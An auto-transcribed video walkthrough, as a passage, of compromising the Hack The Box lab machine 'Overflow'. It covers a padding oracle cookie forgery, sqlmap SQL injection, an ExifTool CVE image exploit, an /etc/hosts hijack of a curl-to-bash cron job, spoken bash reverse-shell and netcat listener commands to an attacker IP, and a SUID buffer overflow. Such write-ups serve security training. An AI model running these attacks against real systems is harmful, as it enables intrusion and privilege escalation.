 what's going on youtube this is ipsec and we're doing overflow from hack the box which starts off with a tough attack it is a oracle padding attack so we can change the cookie from user equals you username that you registered with to user equals admin to get an administrative access to the application it's a tough attack to actually understand and discover but thankfully the tool pad buster makes it super easy to pull off and you don't really need to understand how oracle padding works you just need to understand how to find it and based upon the error message the application gives you it's super easy with that admin access you can find a function that is sql injectable to dump the database and another database that exists on the server to get into a different application that then gets you into a third application that has a file upload or image upload form and it's vulnerable to an exif tool cve when it gets the metadata from that image getting a shell on the server you find a binary that's a buffer overflow slash rop challenge so with that being said let's jump in as always we start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it overflow and then the ip address of 1010 11.119 this can take some time to run so i've already ran it looking at the results we have just three ports open the first one being ssh on port 22. it's banner tells us it's an ubuntu server but there's not much we can do here then we have smtp on port 25 it's banner says it's postfix smtpd but not giving us much more information so there's not much we can do here either then we have http on port 80 its banner says apache hdpd apachehpd2429 so um there's a lot we can do with http so that's where i'm going to be starting obviously the interesting thing because we don't see it much is this smtp but it's kind of like a black box it's not just of a lot of enumeration we can do without knowing anything about the target we could potentially like brute force valid usernames but we'll need to know the domain of the box if we get valid usernames then we can brute force passwords we can potentially email users so those are things we can do but we just need to know more information and maybe the host name of the box is leaking this smtp commands we see overflow right there but let's just go over to the web page so 1010 11.119 we have this welcome to overflow security we got services about beginnings and a lot of like lorem ipsum stuff here so nothing really important um we can do a valid like contact form so i'm just gonna test this out real quick and i always just test with like an image source or script source or something like that to see if there's cross-site scripting so 10 10 11 10 10 14 8 which is my ip address and then slash image we have to close this one and before i send this i like doing sudo nc lvnp 80 to listen on port 80. so if someone connects to us we can see their browser string and then i want to send this over to burp suite make sure i'm intercepting i am send the message and that's interesting um we do have a cookie here but this get parameter is just nothing so we're not sending the content the contact form at all and one thing interesting about this cookie is we have um url encoding so we know right off the bat that this is something unique it's not like just an md5 sum or something like that uh we can decode it quickly in burp suite so if i just do smart decode and then huh i guess it could be base64 uh yeah that could be base64 um let's see echo dash n wc-c 32 characters so it kind of looks like an md5 sum but again it's got capital letters symbols things like that so we know it's not md5sum base64-d and just looks like a blob uh the one thing i'm going to do is xxd it because i want to know if this period is an actual period or just something my um browser or command line did not want to encode so 7 3 4 a b e i'm going to do man ascii real quick do we have b e here bell i don't think that's a period a period should be where is it 2e would be a period so definitely not um wait is that a plus so co yeah so it's a plus on base64 but um when we decode it um it's getting to be be and this is not a valid ascii thing i think oh i was looking at 2b 2b is plus um yeah there is no be so we know right off the bat that that is something weird with the cookie it's just random bites um and the contact form didn't bring us anywhere so nothing interesting there i'm gonna turn burp suite off while we look at the page um we can try to find this is like html or php get index.html nothing index.php we get a page so we can start running a um pharaoh buster i normally run go buster but i've started using ferro buster more and more um the latest version on github not on my box has this collect backups which upon every file it finds it will look for backups of that file the most important one being like the um them swap file of like dot file dot swap like this i think is the vimvap backup but um it's not relevant for this box maybe one box in the future will definitely show this tool off but the other thing i like about it is it does recursion so we don't have to go into each director we can just fire it and let it go so i'm going to do x php because we know it hurts php and then http 1010 11.159 and by default it's going to go in user share set list discovery wrapped medium directories and use that as the word list so we don't have to specify the word list every time we can just let this go and it's going to find any file it's probably going to take a bit longer because again this one does recursion so it's going to look in all these directories which go buster doesn't do so it's a bit more like quicker but if you just want a long running scan i do like ferro buster so if we go to sign in we can try like admin admin to log in and we get invalid credentials this is login.php if we go sign up we can try like username ip password a password and submit this and it says welcome to overflow security and then we have profile um i'm guessing this is nothing because like name email birthday that's not like there this looks like a dead page these links don't work so i'm just going to go back and ignore that we go to blog more lorem ipsum here if i click read more these links don't work so um nothing too interesting we have sql injection insecure file upload buffer overflow and outdated software so maybe we should try sql injection somewhere i just don't know where to try it because this blog looks like a static page so let's go back out here go to pricing dead link and then we could log out um the other thing i want to do is look at the cookie again because now i'm logged in if i go to a new pane echo dash n uh that's not what i want to paste wc-c we have 34 characters oh because we have this url end code 2b and 2b i want to say is a slash let's go back to burp suite and do this smart decode it is a plus and if i remember the beginner video i had said that was a plus ah so it's 32 characters um the next thing we can do is probably try like a longer username i'm thinking because this is random bytes this is some type of encryption not hashing even though we're getting 32 characters um we are uh what should i say like getting random bites it's not a valid hash so i'm thinking it may be to do with encryption and also like um that like slash and plus that we saw in the previous cookie wouldn't be good for a file system so we know it's not storing it there so i'm just gonna do ipsec ipsec i'm gonna see if the cookie length changes we will have to remember to decode it and let's do echo dash n do this wc-c and it's 44. so this is definitely base64 um let's go to our old cookie base64-d and then we can pipe it to wc-c and that is 24. go to a new cookie the super long one base64-d wc-c and this is 32 so i bet if we did an even longer cookie it will um go up again so this is going in increments or not increments maybe it's increments but it's always going to go by 8 so we know this is probably going to be encryption and a block size of eight because ipsec was or just ip was 24 and ipsec ipsec was 32 i'm going to add another ipsec in there and see if we go to 40. if we do we know it's definitely going to be crypto related so let's log out sign up let's do ipsec three times log in with a password a password and that's looking to be the same length off of eyeballing it maybe not let's do smart decode base64-d wc-c still 32 characters so let's sign in or sign up um let me try one more ipsec password of password submit and then let's go paste this cookie smart d code echo dash n base64-d wc-c so now we hit 40. so this is definitely a block size of eight seems like every eight characters we put here we go up by eight so 24 32 and 40. now the issue is like what happens if we change a byte so let's just modify a random byte in our cookie to see what happens instead of this lp i'm going to put ip i guess and then we refresh the page it goes to login.php so let's try logging in ipsec a password um yep password we log in if i just delete a character so get rid of that b refresh and we have it telling us there is invalid padding so if we did a lot of googling on crypto and invalid padding um padding oracle would come up and whenever you get a specific error message about padding you can brute force the um well you may be able to use oracle padding to brute force it one bite at a time and i probably do a better explanation um before let's see oracle padding so probably the lazy video if you go there or go to oxdf's writeup padding oracle is probably gonna be explained a bit better but for this sake just know that um when you get error messages specifically to padding you can probably try a padding oracle attack so i'm gonna check out other error messages so we had error is equal to one all right air equals two three nothing there um i'm going to try a comment after one that looks promising single quote quote so it doesn't look like anything is happening here um zero equals that yeah so i was just testing for basic sql injection and i didn't really get any different results so i'm going to assume this is oracle padding if we go back to ferro buster we see it is still running and doesn't really have that much one error message but still just hunting we have index.php let's go back over here and let's see uh we want to run padbuster and then the url so http 1010 11.119 and then we want to get the um cookie so i'm just going to ip password and see we can just paste this in and then the block size can be eight it's normally eight or sixteen but we confirmed it was eight by looking at the length of the crypto so we know the block size is gonna be eight and we also need to specify the header so it's gonna be cookie auth is equal to the same exact thing and i wanna say that is all we need for pad buster i'm gonna put a time command here so again padbuster url um the secret and then how the secret interacts which is the cookie and this takes a while to do um no error string was provided so we just have to wait for this message to come back because it's doing some type of analysis and then we're going to tell it where the error message is so once we have that this will probably take five to ten minutes to run i think but we do have the time command to tell us so um i'm just hoping this static uh the response analysis runs quickly so it's easier for me to edit the video but i'm gonna pause it and then we'll come back and shortly after i was done talking it did pop up with the following response signatures i'm gonna do the one it recommends which is two and it's just going to continue and we know this one is correct because when we're looking at it before we're looking at the actual error this is what actually tells us the um padding is wrong message and we can see the very first byte has been brute forced it's probably going to go eight times i want to say but um yeah and this may be block i don't know exactly what this one was uh once it gets into crypto um my knowledge is not great so gonna let this run we'll see how long it takes okay it's now been eight minutes and padbuster has completed running we do see it decrypted the value as user is equal to ip and we can see that in hex and then after all this we just have blank characters the zero zero is um terminating the string but one thing padmuster also allows us to do is replace the cookie so i'm going to do dash plane i'm going to say user is equal to admin and just let this run it'll probably take about eight minutes again to run maybe a bit longer um there is something i do want to talk about because the block there's only two blocks in this i know just a few minutes ago i stumbled across like uh cracking each biter block so it takes each block and cracks each bite through the padding oracle because the padding oracle error message exists when it's invalid padding you can brute force this one bite at a time now the weird thing is the length is 24 of this and we only have two blocks and each block is eight so that's 16. i would guess the extra length comes from other things like the metadata around the encryption talk about the algorithm the initialization vector and we can kind of prove the initialization vector by just logging in multiple times and seeing if we get different cookies so i'm going to log out let's go to sign in we can do ip and then a password of password we set it um set this to two so pad buster keeps running and let's intercept this request go here turn brip sweet on send this over to repeater and invalid credentials maybe we have to sign up again maybe it just erased our username so let's turn rip suite off real quick sign in yep password password submit okay so now if i send this we get a cookie and i send it again we get a different cookie so every time we do this we're getting something different which is probably just the initialization vector of the crypto but if we looked at the length every time so if i echo dash n base 64-d wc-c we'll always get 24 as the length because that's just two blocks so the very first set of eight characters i would guess is just metadata around the crypto and i don't know how to show you that um just like this um so i'm not even gonna try to bs my way around it it's just my guess at exactly what is happening here um but i'm gonna wait for this whole padding oracle attack to finish and we get a cookie that gives us user is equal to admin and again it's going to take over eight minutes so with some editing magic we'll just jump ahead and seven minutes later we have a new thing it says the encrypted value is this let's go and try this out so i'm going to go to auth paste in this new value go to home index and we have a new thing called admin panel so we have successfully logged in as the administrative user by just doing an oracle padding attack if we go here we have this cms made simple i try logging in with admin admin i don't have it and i don't know the admins password because we just forged a cookie through the oracle padding attack so there's not much we can really do on this page without like an actual exploit we could look at search point and see if there is one for cms made simple but there is also a logs endpoint so if i go here we just get undefined i'm going to look at exactly what that request did so i'm going to go to burp suite let's turn intercept on and then click logs again uh that was weird nothing happened let's for this and it's getting home logs.php and we have a host of overflow.htb so that's probably why this is airing because it's trying to put information on the page somewhere and we can probably better show this if we just look at the network tab reload the page and we see let's see is there any error messages what happens if i click logs i was expecting to see something to overflow.htb but i don't see refresh again there we go so we have this one uh it's not even a 404 error message it's just blocked because we don't have dns here so uh what i had done here is i did ctrl shift r to um like refresh without cache if i just do controller looks like it still does the same thing but this is me hitting controller you can see all these pages if i hold shift when i press r it gets more because it's wiping the cache uh that time we didn't get that thing so early enough i don't see it every time but i just want to get overflow.hdb in my host file so sudo vi etsy host and we can do 10 10 11 119 overflow.hdb save this now when we refresh this page we should now get overflow.htb maybe it's cached looks like it may be a coors header as well so i'm just going to go and navigate to it so if we do overflow.htb we go here unknown her did i type of this i'm just doing it twice to make sure i didn't typo but this could be a caching issue that just takes time to fix there we go did i o-v-e-r-f-l-o-w i don't think i type of that i don't think i need it twice i'm just going for good measure delete this entry refresh yeah it was a dns caching thing that's such an annoying issue to work with but um if we do this we get unauthorized so we probably want to add a cookie because for some reason a cookie's not here so auth is equal to oh the cookie's not here because um we change domains so let's see if i go back to my storage we grab this and i go to overflow.htb i won't be logged in anymore because again we changed domains i'm just going to log in with ip password let's probably delete my account by now do we have a cookie here though we don't sign in yep password submit uh what ipsec password password submit there we go so now i have the cookie generator i could have made it myself but i'm always lazy like the site to do it for me so now if i go click on logs we get login timestamps so what was happening before again um i just did not have the cookie set so let's copy this go here uh it was what cookies off is equal to this is it cookie yeah i always get that mixed up as well if it's cookies or cookie but here we go we have a login thing and if we change the name to ipsec we get nothing yep so it looks like it only works with admin if i do a single quote we get internal server error if i do a double quote it does an okay so right now i'm thinking i created an sql error because if i just did ip as well it just says 200 okay so if i do a single quote and then a comma a comment we get internal survey error and sometimes sql statements use parentheses so we can add that there and now it's 200 okay so we know we have sql injection here we can do like union select one two three and we see last login down here we can go through the whole manual way of exploiting this but i'd rather just go into sql map so let's just save this request to a file so copy request to file what is that save entire history there we go copy to file um hdb and the box name is overflow and i'm just going to do logs.request save it and then we can just do the time command again sql map and the only reason i'm adding times you can see how long these things take uh dash dash dump dash r there's gonna be logs.request uh we can actually just do we can do dump first and just see how long it takes to dump everything and then add dash dash batch so it doesn't ask us any questions and this is probably gonna take a while to run so i'm just gonna let this run um grab a drink and we'll come back when sql map dumps everything so that really took no time at all and the reason why is it only dumped the current database i wanted to add like the dash dump dash all flag to dump everything but this can take a while to run because of the information schema so i'm just going to look at what databases are available because if you remember there was a second thing the um admin panel pointed to the cms panel and we have it here um there's also a overflow database we only dumped logs so we can dump everything so let's do um dash dash dump we can do d i'm going to look at overflow first and it's automatically trying to crack some things uh we probably shouldn't have done uh something um i meant like the dash dash batch because it automatically attempts to crack all things but we do have a password here if i do echo dash n wc-c that is 32 characters so probably going to be an md5 some uh we can log out and try logging in with that password to see if we have that admin this hash and we get invalid credentials there is also that other database if we look back at the dbs we have cms msdb so i'm going to dump that one as well cms msdb and it's going to start dumping a lot of tables so i'm guessing it just got to a username list because it's attempting to crack already this one may be users um i'm not sure let's just let uh sql map finish so a minute later we have it done um we didn't have to do the dump we could have done like dash dash tables and like dumped each table this way like we could do this and then specify dash t cms users i believe would also work um i forget exactly how to specify an exact table in sql map but the way i generally go about it is i just dump everything because i want the whole database and then i go into dot local uh what is it share i believe and there's a sql map directory here this is where it stores all the history of your commands and then i go into output and i go overflow.htb and we can go into dump and it dumps everything into um csv files so here we can just look at cmsus.csv and look at that table so this is generally how i do it we have user id email active password so admin and we have this md5 summit looks like that looks like 32 characters echo dash n wc-c 32 so i'm gonna go over into the kraken and we can go into hashcat v hashes overflow i'm gonna put this md5 sum and then we can go into the overflow table and put the next md5 sum as well and try cracking both of these so dot slash hash cat i think mode 0 is actually md5 sum but i'm just going to see what happens if i just give it 32 characters actually that's going to be the same for ntlm example hashes less md5 is hash mode 0. so let's do dash m0 hashes overflow upped word list rock you to see if we can get any quick wins here i'm not sure exactly what uh dictionary file um sql map uses but i don't think it's rakio and it looks like it is just about done and we don't have any cracks which is a bit odd so i'm gonna go look at the actual software if we go into let's see the admin panel this cms made simple so if i google cms made simple let's see what we have if i just download it see once download is it not sure save file let's move this here so i'm going to makeder cms and then we can move downloads cms made simple into this directory and then unzip it and wait what it's just a single php file i don't like this and then it is compressed here i don't i don't know exactly what's going on there for that installer i just want the source code that is a weird way to do it i'm guessing the application like if i do a du-hs on this yeah there's a 6.8 meg php file so it's got a bunch of things packaged in here so i'm going to try to download it from subversion which is just like get and i'd copy their svn command to download it and it looks like this may be doing a better job i'm kind of like nervous because of like all these file names like this nl.php i'm guessing that's just languages and we have a normal thing so this looks better um grep dash capital ri md5 and let's see micro tiny utils hash salt we have to figure out how the login works so let's see is it like a login.php find.grep login if i do admin v login.php and it's been a long time since i looked at this let's see how do we do the hash code md5 user password time see if i go to this include maybe that's in there where was that include lib v lib include so something here let's grab this whole file for password prep dash i password don't have anything and hashcat did not crack anything so let's just trace the login request so if i go back to the cms made simple i'm just going to open up the network tab we can do admin admin try to log in then i can look at this request whoops did not mean to double click go here look at the request we're sending the password and a variable called password and a post so what i'm going to do is grep dash capital r and then we can do post if i should do our i and then password like this unmatch that let's escape this okay so we probably want to get rid of all the languages so i'm just going to grab v language and we only have this appearing in login.php and i can see user to set password i'm guessing that's going to be the function but we can just look at this login.php set password so see if i do set password elsewhere it's only here so this is the forgot password change form but there is a function called set password and that's going to tell us how this is md5 so grep dash r set password like set password oh let's see grep dash v wonder if i can get rid of cms mailer what is this right here we have function set password right here in this lib so let's look at this class userinclude.php get rid of the starting with the slash set password and it is an md5 but it's doing a salt so it puts the site mask next to password i'm guessing this get site preference is going to be site mask and if sitemask doesn't exist it does nothing so we just need to figure out what site mask is and then put that before the password and this is a way that a lot of old like web forms used to do salting if we look at the shadow file of our box we'll notice that the salt is unique per user which is the correct way to do it a lot of web forms initially just had one static salt for every user so once you figure out the salt you can brute force all the passwords the whole idea was if your user table got leaked then they can't really crack the password because they don't know the salt for that md5 however if your user table gets leaked chances are the attacker is also going to leak the salt if you have a universe assault so let's look at the site mask variable and we can easily just go what is it local share sql map then output overflow.hdb [Music] dump cmsdb and i'm going to grep uh what was that it was pref or something probably site pref it's just cat or shoot um i guess i can go back in the source and pull it this is why it helps to take notes can't do everything off memory even if it was just like a second ago oh let's see fine dot grap user cd classes v class dot user.include dot php set password so site mask is what i want grep r site mask and we can see the site mask value is this if i view the cms site preference file we can see it's weird i was expecting it to have the titles like this would be the val um the preference then comma the value or something because we don't have create date modified date we have the site preference name and site preference value i think this i guess if it's blank it's putting it here at the end it's a weird way for sql map to do it but we do have the site preference value i was expecting it to do blank blank like this would make more sense to me because this is the header for your csv file so seeing create date modify date and then seeing the very first value be sight mass i'm like that's not a date but i guess the blanks just go to the beginning that's weird uh site prep name site mask say prep value this so we have the site prep value now so let's copy this go over to the cracker let's see v yeah v hashes and then overflow and i think the format is salt uh password then salt and this is the one for cmsdb this is the one for overflow i'm just going to delete that one i really hope i got that right um let's see ls grep user let's just cap this starts with c6 starts with c6 okay so now we can do the example hashes again and we have let's see this is md5 sum password then saw we don't want that we want salt then password and that is hash made 20 salt dot pass so if i rerun this and now change it to 20 because the hash's overflow is the md5 colon sort which is the format it wants we can try cracking this and if it doesn't work then i'll probably put the salt before the password hash because i may be doing that wrong but i'm pretty sure salt comes after so now it's running with rock u and let's see 68 percent and it did not crack however as it was working i just thought of something um i ignored this second entry because we had the blank thing but we do have a username as editor and an other md5 hash so i'm going to try grabbing this one as well and let's just try cracking this before we change anything go back to hashcat v hashes overflow and then let's put this in and attempt to crack this and see if this one returns anything and almost immediately we do get a response back alpha bravo thing here and that was the editor username so we can probably log into this now so if i do editor put in this password we get access to this cms now that we have access it's probably time to look at exploit db because normally when you have a content management system there's not unauthenticated rces that are common but authenticated ones are extremely common because oftentimes you can just edit a file somehow in this uh cms and then get code execution that way so i'm just gonna search exploit db for cms made simple and here we go we have a rce on two two one five and it's present in edit user tag so login as administrator extensions user defined tags we're in editor we don't know if we're administrator but we're in the admin console so maybe we are so let's go to user defined tags and one thing i do note is make sure you check dev job dot overflow.htb but let's try to add the tag real quick so i'm gonna do uh what it says is it in the name or not it just says exec so i wonder if we just do exec we'll try actually instead of exact i'm just going to do php and fail i want to do that in both places uh udt name starts with what let's do test there we go and we don't have php info here um so i don't think it's executing we can go ahead and do what it says and just put a reverse shell maybe we don't get output from this command so i'm going to try putting the reverse shell here and seeing if we get anything so we want 10 10 14 8 then 9001 that looks good let's just do nclvmp 9001 submit and nothing is happening so we don't have anything let's check out this dev job workflow thing so i'm going to add this into my host file so sudo v etsy host and we can add this hostname here navigate to the site and we have a login i'm going to try editor and then that password again the password is like alpha bravo right right here let's grab it paste login and we have something we can navigate around to see exactly what this is um we got an account here if i click on account we can upload a resume these buttons don't do anything if i click this it should try to upload something i'm gonna put this in burp tweet to see what it says uh we need to turn it on do this we get a move temporarily and it goes upload two and nothing we have a log out let's turn burp suite off oh file type not supported did it say that here right here file type not supported i wonder if we did a pdf or something so let's do find great pdf and i'm just going to copy a random pdf that i have on my box if i file it we do have a pdf document let's try uploading this so htb overflow decrypt.pdf file type not supported so we want to try to figure out exactly what file types are supported here see do we have something here post file upload upload file i'm guessing it's something i'm just not reading okay upload your resume in tiff jpeg or jpg right here i think if i just read this text the light gray on white background is not super easy to see but we want a resume and jpeg format so i'm just going to find a random jpeg see if we have something uh let's see we can use this sliver one so cp upload resume video one sure file uploaded successfully so if we look through exactly what happened here um let's see is this us file name that's a pdf so right here we uploaded the file this jpeg and it gives us exift tool output specifically the version so i'm going to google exif tool 11.92 so exif tool 11.92 let's turn brep suite off i always just hate intercepting my regular internet traffic so that's why you see me turning it off and on so much um [Music] we have this cve 11 dot c version audio version of it exif tool so 12.23 what version is this it was 11. something so i'm guessing this is going to be vulnerable so this i wonder how we get the payload.bin i'm going to just google the cve and github and see if we have something so let's clone this and see how this works so get clone cd cve and we have a config file which is just exif tool stuff then we have exploit.pi and this is going to look like it creates a pearl reverse shell here so we should put our ip address so 10 10 14 8 9001 and if we read let's see this entire post we'd understand exactly how the exploit worked um it tries to pass something in the i guess deja vu file format that leads to code execution so let's just try this out to see if it works it looks like we have edited all we need we just need to put the ip address so python3 exploit.pi uh no such file or directory name bzzz so we probably need to install bzz because it's doing the sub process run on bzz dejavu make and exif tool so apt search bzzz does this exist um let's see install bzzz apt or install dj vu see apt search dj vu that is a lot of things viewer for the format simple creation of deja vu files i'm going to try installing this real quick sudo apt install deja vu bind we can go to the github repo to see if they said anything um they do we need to install deja vu libre bin so i'm gonna just leave this bind to see if it actually works after this and if it doesn't then i will follow the guide so it looks like when i installed was probably um just more things than i needed i'm guessing this is a specific package but the deja vu bind package probably included this foo libre bin yeah so i installed a lot more packages i should have read the read me first so if i do strings on image.jpg grep 1010 is that what it created one file image updated see i'm guessing it's this image.jpg let's try uploading it and we have our reverse shell listening so if we go let's see where's the cms made it was the dev build right this and then go to my account upload resume and let's try image dot jpeg we see it's hanging which is a good sign because we got a shell so python 3 c import pty pty dot spawn bin bash stty raw minus echo fg enter enter and then export term is equal to x term so i can clear the screen and now we have access to the server the very first thing i always like doing is extracting the uh sql passwords or sql passwords i'm going to go in the config directory cat db.php and we have dev manager and this password so let's see let's go up one v creds dev manager let's copy this password and that's also the develop table okay and then we can go into html see if it's using the same creds cat db.php and we have another my sequel this is developer and then sh at t i am at n and this is the overflow table okay so let's cat etsy pass wd and we do have a user called developer and we had a password for developer so let's just try a su so su-developer s-h at t-i-m-n and it looks like we log in as developer so i'm going to try ssh in real quick so we get a better shell 1010 11.119 and then sh at t i am at n i may have typo that let's cat creds i'm just going to copy and paste because that will make sure i don't typo paste and there we go so now we have a shell as developer something weird is happening we have illegal option dash o history if i just type bash i get the normal prompt that i want i'm guessing i was in like a shell prompt do we have tab auto complete no we don't here if i type bash now i have tab auto complete so now we're part of developer if i do cd home we still don't have a user.txt flag so um i always like finding what files i can edit so i'm gonna do a find dash user developer i think i do slash like that or slash at the end um let's see i think it's like this and then to dev null and i can also specify dash ls so this is going to show me all the files i own and i'm going to prep dash v for slash run and slash brock because we don't care about those directories and i'm going to get rid of this ls because it's making my things go off the line like there's too much data here the main thing i did dash ls because i wanted to make sure i was only saying files earned by developer and that looks like it's the case so we have lxc am i part of that group no i am not i am a part of the network group that is interesting uh that's my home directory that's cis so we can add cis to the exclusions because that directory is not interesting to us uh devpts so we don't really have anything interesting um we can do the groups if i do dash group network because really interesting i'm part of that group and there's only one file etsy hearst if i look at this file lsla etsy host it looks like let's see we can write to this file because we're part of the network group and these are the group permissions we have right access to etsy host and as i say that looks like my etsy host um i'm just going to put 127.022 test test as well make sure i can write to it cat etsy host and i can write to this file so that's unique um looking in developer not exactly sure what i can do i'm going to go back to the group let's look at group developer to see if there's anything here we have lxe stuff we have a vim info file ssh and nothing else so i'm going to look at the vim info see if we have anything this is probably us right that's wq i think on the history file or that's e-host so yeah we're only editing etsy hearst in this vim info file so nothing interesting there so let's look at all the users on this box i'm going to cat etsy passwd grab for everything that ends in sh and we can see there's root tester and developer uh there's also dub dub dub data that we were but that is a new login thing so if i grab this for dub dub dub we can see it's no log in here but there is this tester user that i'm curious about so i'm going to go back to my find command and we're going to specify the dash user option i'm going to look for files owned by tester to see if there's anything here and the reason why i'm doing this is mainly because like i don't have the user flag yet so i'm just seeing if there's anything else interesting there is this home tester directory and we can't read user.txt because we're not a part of the tester group there is mail can i read his mail if i do for our mail tester permission denied um we also have common tasks dot sh so if i look at this uh i'm guessing there's some type of crown running it says make sure it's running every minute and then doing bash and this process substitution thing here if you want to know more about process substitution we just covered it on um my channel if i do youtube.com c ipsec i would recommend watching executing linux binaries without touching disk because we go into exactly what process substitution is in depth but for this it's making a call request to task.overflow.hdb task sh and piping to bash so essentially this is doing the same exact thing as um this right these commands are pretty much identical so we have the ability to edit the um etsyhurst file so i'm going to point taskmanager.overflow.hdb to my box and put a reverse shell there and we should be able to escalate to the test user so let's delete this 10 10 14 8 point that and then i'm going to kill that pane make dirt dub dub dub v test dot sh and we're just going to do a bash reverse shell so bash dash i dev tcp 1010 14 8 9001 like that then python 3 m http server listen on port 80 and start up another netcat shell so save this and then we probably have to wait for the next minute which we literally just missed or wait maybe not it did a get on it and i have the wrong file name shoot um say move dot dot slash what i call it test.sh did i really call it that i did move test.sh to task.sh and now this should work so if i do date we have it in 30 seconds so probably and another half a minute we'll get a hit so i'm going to pause the video and we'll just wait and here we go uh we see it hit and we got a shell as the tester user so i'm going to do python 3 c import pty pty dot spawn actually let's do a ssh we always do reverse shells and like import pty but um we can just ssh as the user if we create a new key so sh-key gen we'll call the file name tester cat tester dot pub and let's just copy this and then echo it into authorized keys like that and then we can just sh-i tester tester at 10 10 11 119 uh [Music] cat tester okay i don't know why that did not work chmod 600 authorized keys there we go just a permission issue so now we can close that pane and we have a better ssh prompt so let's see we get user.txt if i look at all the files here there's nothing really interesting if i go back to this op directory there is a file encrypt and we can also see there is a plus here so that plus is an extended attribute if i do a get facult command on common task.sh we can see developer has read write over that so when we read this before as a developer user i think i sent it to this pane we went into slash opt common task like you may be questioning why can we read that because everyone doesn't have read execute or read write or anything and we're not a member of tester but if we do get fackle on this file again uh get back on common task we can see the extended attribute does allow us to read to it so that's why we can read this file if we go into this file encrypt there is a readme here and a couple of reports have been leaked to avoid this created a tool to encrypt reports please use the pin feature and report any issues the pin should be in your inbox so if i look at my inbox let's do a mail command verse pool mail cap tester let's see from test drive overflow received root so this is a cron and we just have junk here so there's nothing in the mail so awesome let's go back to file encrypt if we execute this file we have the pin let's do one two three four wrong pin um let's try it again and what i'm noticing is we have the same code every single time so the three times i ran this file we have the same code so i'm going to copy it to my computer and we can test this out to see exactly what is going on so um i'm just going to scp it that would be the easiest so scp i tester tester at 10 10 11 119 opt file underscore encrypt here and i'll specify dash r so we copy a folder um i put the private key in my www directory probably should move that out of there um because if this was an actual engagement i'd be potentially leaking a private key to a box which definitely is not good so move file encrypt also out of the dub dub dub and if i execute this we get the same exact pin so something obviously is like wrong here i would expect this pin to be different each time so let's open up in ghidra and see what kidra says about this binary may take a second to open it but once we do it we can do file new project and we'll just call this overflow and then click the little dragon icon to open the like disassembler or decompile or whatever you want to call this then i hit i and i just open up the file and we'll do all the default options for analyzing this analyze okay if i go over to the functions we can see there is a checkpin function an encrypt function and main let's start with main and all main is doing is running this check pin and then returning zero so let's go into check pin and we can see it starts off by just doing rand and then enters code for pin so this is just an insecure way to do rand you should call s rand before random to initialize a random seed and i think sram by default uses the time so that's not a great option but it's better than what we see here so if i just man i think srand it tells us so if no seed is provided the rand function is automatically seeded with a value of one and the seed think of it as just a database on all random numbers so this is where it's starting it's the initial calculation of random which sounds weird because you can never calculate random because when you can calculate random it's no longer random um so every time it's doing this it's just initializing with one so every time we run the application it's going to be the same so we know this is not random even though the function's called random and then it says this is the code enter the pin and let's see we could probably figure out how to calculate this pin let's see what is it doing here so enter pin if local 14 is equal to local 18 print name where are we calculating pin if i look at check pin that's where i'm at i'll bet it's this random function yep this this is not actual like um a specific like c thing they actually created a function called random and we can see what it's doing here we could calc we could like do this in python or something so we can build a pin code brute forcer but i think oxdf does that i'm going to do it slightly differently because um it's the same thing every time as we execute this program it's going to be the same pen whether we're on this box or this one so i'm just going to do the cheating way and gdb this so we'll reverse it if you want to look at the code i'd highly recommend his blog because i don't think he's going to do it this way i think he's doing it through the python program so i'm just going to break on main we can run this and then i'm also going to break on check pin continue and now we're here um we want to get to this check pin if we go where is it there's a back here if i click this there we go we want to break on this line so i want to get my disassembly here and if i highlight this if then it should highlight in the code where i'm at in this let's see is this that yeah i don't know why it's not highlighting see windows decompiler there we go now it's highlighting there we go and we have the disassembly on this compare line so we want to break at 10b09 now we're not at like 10b here if i look at this ab4 if we go up where is ab4 should be here so we see 0s 10 a b 4 sub esp24 sub esp24 so this whole piece of the memory address doesn't matter we just care about these i think three nibbles i think that's what it's called but if i break on the last three of this so b09 we should break on this actual compare call uh we could do x slash x i think to examine or x slash i to examine the instruction so if i do x slash i and paste this maybe i don't do a stir we can see the instruction at this address is definitely that compare so i'm just going to continue so we can enter a pin code and now we're at the compare eax is probably going to be mine so if i just print uh we can do the whole thing dollar eax we see 4d2 if i convert this into decimal so echo this like this we can see it's one two three four which is the pin code we had entered so now we want to get this ebp minus 0x10 so if i just print this we get pointed to a memory address if we examine it maybe i don't do a star we get the actual signed uh assigned value of negative 202 976 456. so if i just try to put this in the program so dot slash file encrypt enter the pin we actually pass so i do ipsec it just says thanks for checking you can give feedback to developer if i try this again we put a invalid pin it says wrong pin so this isn't really that useful it's just giving a name and we're not doing anything so if we look at this going back to this code we're right here we're just asking for a name and then returning to main and main after checkpin just goes to nothing so if we look at this code this is actually a buffer overflow even though like this scan f looks identical to this scanf there's something different about it this is just loading it into local 18 which is defined as an integer which has a max length so no matter what we do it's going to convert it to int and that's not overflowable however on this second call to scan f this is going to local 2c and that has a size of 20. so this we're now overloading it because we're putting data from the user into local2c which has a size of 20. so if we just go over 20 we overflow the buffer and get into the eip register where we can direct the program anywhere we want so let's begin the first thing i want to do is save this pin code over to the side because i have a feeling i'm going to be copy and pasting it a lot so let's just echo to print that out so we can easily copy and we can do gdb on file encrypt and we want to break on main again we can run it continue we enter the pin code and then we want to control c so we can do pattern create because we want to know exactly where we overwrite um eip so i'm going to continue again we paste this and we crashed and we crashed at 616161c which is eip so if i just do now pattern offset just search for this we can see it's at line or offset 44. so let's run this again put the pin code in and then we want to print 44 a's so python 3 c print a times 44 and we're going to put four b's after this to confirm we are writing where we think we are so four b's we crash it and it stopped at four two four two four two eip is at four b's so this is really good for us now we have an eip over right we have to figure out exactly what we want to do um rop is going to be the most likely thing and then was initially looking at this program there was a function here called encrypt and encrypt looks like it can potentially read files so the very first thing i want to do um do it lsla we can confirm this is a set uid file so when we execute it it's running as the root user now the file itself does have uh pi enabled i believe let's is it check sec there we go on what is the file name file encrypt because it does have pi which will be like randomization of memory addresses but we can check the actual host so if i cat proxis kernel randomize va space this is going to check if aslr is on the system and if aslr is not on the system the memory address is going to be the same every time we run it so uh cat proc sys kernel random oh randomize vi space there we go and it's set to zero so aslr is disabled if this was two it would be on also if it was one it would be on as well but most times you see this being set to two if i cut it on my host we can see it's set to two there so aslr is enabled but since it's not enabled we should be able to just call this encrypt function manually so let's just go back into gb okay we can break on main run print encrypt it is at this memory address and that actually looks like it's all um ascii python3 c print i think we just do backslash x like this yeah that is an ascii memory address so we got lucky there so we don't have to do anything too fancy so if we just do python 3 c print a times 44 plus this string we should be able to get into the encrypt function so let's test this out because we're overwriting eip to point to encrypt so if i just do file encrypt enter the pin negative 202 976 456. put this and we seg faulted that is not what i expected 44 plus vue x let's make sure this echo dash n because we may have done something wrong wc-c 44 i mean it could be like an endian thing maybe we 